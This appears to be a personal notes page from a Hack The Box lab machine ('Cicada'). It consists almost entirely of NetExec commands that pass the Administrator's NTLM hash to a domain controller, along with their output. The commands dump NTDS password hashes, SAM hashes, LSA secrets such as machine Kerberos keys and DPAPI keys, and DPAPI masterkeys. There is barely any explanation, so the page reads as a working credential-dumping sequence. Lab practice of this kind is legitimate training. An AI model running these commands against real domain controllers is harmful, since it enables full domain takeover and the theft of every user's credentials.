
ntds
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --ntds  
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
SMB         10.129.169.79   445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.169.79   445    CICADA-DC        [-] Could not connect: timed out
```
failed

ntds vss
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --ntds vss
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y                                                                                                 
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
SMB         10.129.169.79   445    CICADA-DC        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.169.79   445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::                                                                                                                  
SMB         10.129.169.79   445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                          
SMB         10.129.169.79   445    CICADA-DC        CICADA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::                                                                                                                    
SMB         10.129.169.79   445    CICADA-DC        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3779000802a4bb402736bee52963f8ef:::                                                                                                                         
SMB         10.129.169.79   445    CICADA-DC        cicada.htb\john.smoulder:1104:aad3b435b51404eeaad3b435b51404ee:0d33a055d07e231ce088a91975f28dc4:::                                                                                                      
SMB         10.129.169.79   445    CICADA-DC        cicada.htb\sarah.dantelia:1105:aad3b435b51404eeaad3b435b51404ee:d1c88b5c2ecc0e2679000c5c73baea20:::                                                                                                     
SMB         10.129.169.79   445    CICADA-DC        cicada.htb\michael.wrightson:1106:aad3b435b51404eeaad3b435b51404ee:b222964c9f247e6b225ce9e7c4276776:::                                                                                                  
SMB         10.129.169.79   445    CICADA-DC        cicada.htb\david.orelious:1108:aad3b435b51404eeaad3b435b51404ee:ef0bcbf3577b729dcfa6fbe1731d5a43:::                                                                                                     
SMB         10.129.169.79   445    CICADA-DC        cicada.htb\emily.oscars:1601:aad3b435b51404eeaad3b435b51404ee:559048ab2d168a4edf8e033d43165ee5:::                                                                                                       
SMB         10.129.169.79   445    CICADA-DC        [+] Dumped 9 NTDS hashes to /home/fixit42/.nxc/logs/ntds/CICADA-DC_10.129.169.79_2025-08-01_003954.ntds of which 8 were added to the database
SMB         10.129.169.79   445    CICADA-DC        [*] To extract only enabled accounts from the output file, run the following command:
SMB         10.129.169.79   445    CICADA-DC        [*] cat /home/fixit42/.nxc/logs/ntds/CICADA-DC_10.129.169.79_2025-08-01_003954.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.129.169.79   445    CICADA-DC        [*] grep -iv disabled /home/fixit42/.nxc/logs/ntds/CICADA-DC_10.129.169.79_2025-08-01_003954.ntds | cut -d ':' -f1
```

sam
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --sam   
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
SMB         10.129.169.79   445    CICADA-DC        [*] Dumping SAM hashes
SMB         10.129.169.79   445    CICADA-DC        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::                                                                                                                  
SMB         10.129.169.79   445    CICADA-DC        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                          
SMB         10.129.169.79   445    CICADA-DC        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                 
[00:38:47] ERROR    SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn´t have hash  regsecrets.py:436
                    information.                                                                                              
SMB         10.129.169.79   445    CICADA-DC        [+] Added 3 SAM hashes to the database
```

lsa
```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --lsa
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
SMB         10.129.169.79   445    CICADA-DC        [+] Dumping LSA secrets
SMB         10.129.169.79   445    CICADA-DC        CICADA\CICADA-DC$:aes256-cts-hmac-sha1-96:927c80eadcc156ecbd4cb320263b6b1abf3b30327549b6cc9ce36513c83164b3                                                                                              
SMB         10.129.169.79   445    CICADA-DC        CICADA\CICADA-DC$:aes128-cts-hmac-sha1-96:de29692730025f0a64cc3df3cba86e51
SMB         10.129.169.79   445    CICADA-DC        CICADA\CICADA-DC$:des-cbc-md5:076efb4f6de99443
SMB         10.129.169.79   445    CICADA-DC        CICADA\CICADA-DC$:plain_password_hex:6209748a5ab74c44bd98fc5015b6646467841a634c4a1b2d6733289c33f76fc6427f7ccd8f6d978a79eec3ae49eb8c0b5b14e193ec484ea1152e8a04e01a3403b3111c0373d126a566660a7dd083aec1921d53a82bc5129408627ae5be5e945ed58cfb77a2a50e9ffe7e6a4531febd965181e528815d264885921118fb7a74eff51306dbffa4d6a0c995be5c35063576fc4a3eba39d0168d4601da0a0c12748ae870ff36d7fb044649032f550f04c017f6d94675b3517d06450561c71ddf8734100898bf2c19359c69d1070977f070e3b8180210a92488534726005588c0f269a7e182c3c04b96f7b5bc4af488e128f8                                                             
SMB         10.129.169.79   445    CICADA-DC        CICADA\CICADA-DC$:aad3b435b51404eeaad3b435b51404ee:188c2f3cb7592e18d1eae37991dee696:::                                                                                                                  
SMB         10.129.169.79   445    CICADA-DC        dpapi_machinekey:0x0e3d4a419282c47327eb03989632b3bef8998f71
dpapi_userkey:0x4bb80d985193ae360a4d97f3ca06350b02549fbb
SMB         10.129.169.79   445    CICADA-DC        [+] Dumped 6 LSA secrets to /home/fixit42/.nxc/logs/lsa/CICADA-DC_10.129.169.79_2025-08-01_003905.secrets and /home/fixit42/.nxc/logs/lsa/CICADA-DC_10.129.169.79_2025-08-01_003905.cached
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ nxc smb 10.129.169.79 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341:2b87e7c93a3e8a0ea4a581937016f341 --dpapi   
SMB         10.129.169.79   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.169.79   445    CICADA-DC        [+] cicada.htb\Administrator:2b87e7c93a3e8a0ea4a581937016f341 (Pwn3d!)
SMB         10.129.169.79   445    CICADA-DC        [+] User is Domain Administrator, exporting domain backupkey...
SMB         10.129.169.79   445    CICADA-DC        [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         10.129.169.79   445    CICADA-DC        [+] Got 8 decrypted masterkeys. Looting secrets...

┌──(fixit42㉿kali)-[~/boxes/htb/cicada]
└─$ ls -la 
total 18352
drwxrwxr-x  2 fixit42 fixit42     4096 Aug  1 00:34  .
drwxr-xr-x 12 fixit42 fixit42     4096 Jul 31 18:15  ..
-rw-rw-r--  1 fixit42 fixit42     4209 Jul 31 20:14  20250731201450_computers.json
-rw-rw-r--  1 fixit42 fixit42    22566 Jul 31 20:14  20250731201450_containers.json
-rw-rw-r--  1 fixit42 fixit42     3313 Jul 31 20:14  20250731201450_domains.json
-rw-rw-r--  1 fixit42 fixit42     5458 Jul 31 20:14  20250731201450_gpos.json
-rw-rw-r--  1 fixit42 fixit42    85670 Jul 31 20:14  20250731201450_groups.json
-rw-rw-r--  1 fixit42 fixit42     5167 Jul 31 20:14  20250731201450_ous.json
-rw-rw-r--  1 fixit42 fixit42    22307 Jul 31 20:14  20250731201450_users.json
-rwxr-xr-x  1 fixit42 fixit42      601 Jul 31 19:55  Backup_script.ps1
-rwxr-xr-x  1 fixit42 fixit42     1266 Jul 31 18:38 'Notice from HR.txt'
-rwxrwxr-x  1 fixit42 fixit42    49152 Jul 31 23:20  sam.hive
-rw-rw-r--  1 fixit42 fixit42        0 Aug  1 00:06  sessionresume_mHbYluqJ
-rw-rw-r--  1 fixit42 fixit42        0 Jul 31 23:38  sessionresume_uEBaqhYy
-rw-rw-r--  1 fixit42 fixit42        0 Aug  1 00:34  sessionresume_WpRpZIbX
-rwxrwxr-x  1 fixit42 fixit42 18558976 Jul 31 23:21  system.hive
-rw-rw-r--  1 fixit42 fixit42       75 Jul 31 19:27  usernames.txt
```
